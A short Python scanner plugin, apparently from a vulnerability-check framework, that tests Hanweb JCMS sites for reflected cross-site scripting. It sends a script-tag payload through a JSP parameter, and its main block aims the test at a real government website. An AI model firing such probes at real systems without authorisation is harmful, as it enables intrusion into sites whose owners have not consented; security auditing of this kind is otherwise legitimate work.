#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2014-076816
#__Author__ = Mr.R
#_PlugName_ = JCMS_XSS Plugin
#_FileName_ = JCMS_XSS.py

def assign(service, arg):
	if service == 'hanweb':
		return True,arg

def audit(arg):
	url=arg+'jcms/m_5_b/selmulti_column.jsp?type=1&userId=2222222%2b><script>alert(/test/)</script>'
	code,head,body,errcode,fina_url=curl.curl(url)
	if code==200 and '<script>alert(/test/)</script>' in body :
		security_info(url)
if __name__ == '__main__':
  from dummy import *
  audit(assign('hanweb','http://www.wugang.gov.cn/')[1])